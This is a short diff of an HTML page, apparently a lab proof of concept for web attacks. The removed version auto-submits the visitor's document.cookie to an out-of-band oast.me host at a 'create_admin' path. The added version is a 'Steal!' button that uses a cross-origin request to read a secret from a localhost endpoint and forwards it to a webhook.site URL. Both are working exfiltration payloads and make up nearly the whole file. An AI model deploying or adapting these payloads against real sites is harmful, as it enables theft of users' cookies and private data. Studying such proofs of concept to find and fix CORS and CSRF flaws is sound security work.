@@ -1,15 +1,18 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <button onclick="stealSecret()">Steal!</button>
 
-<form method="POST" action="https://d684qtq410b1l1gjst1gcmahxxph9trw9.oast.me/create_admin">
-  <input type="hidden" name="new_admin_login" id="cookie">
-</form>
-
-<script>
-  document.getElementById('cookie').value = document.cookie;
-  document.forms[0].submit();
-</script>
-
+    <script>
+        function stealSecret() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://localhost:8080/secret-cors-1.php', true);
+            xhr.onload = function() {
+                alert('Stolen: ' + xhr.responseText);
+                fetch('https://webhook.site/4b5474f2-695c-4f48-88ff-17336c3b9208?data=' + encodeURIComponent(xhr.responseText));
+            };
+            xhr.send();
+        }
+    </script>
 </body>
 </html>
